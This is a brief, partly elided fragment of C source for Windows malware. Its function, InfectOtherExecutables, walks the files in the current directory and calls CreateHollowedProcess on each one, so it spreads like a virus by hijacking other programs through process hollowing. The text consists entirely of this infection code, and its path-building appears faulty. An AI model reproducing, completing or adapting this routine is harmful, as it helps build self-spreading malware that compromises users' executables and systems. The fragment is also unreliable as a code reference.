...
void InfectOtherExecutables(char* pSourceFile)
{
	printf("Infecting other executables in directory...\n");

	char szSearchPath[MAX_PATH] = { 0 };
	char szFullPath[MAX_PATH] = { 0 };

	GetCurrentDirectoryA(MAX_PATH, szSearchPath);
	...
	do
	{
		...
		strcpy_s(szFullPath, MAX_PATH, pSourceFile);
		strcat_s(szFullPath, findData.cFileName);

		CreateHollowedProcess(szFullPath, pSourceFile);
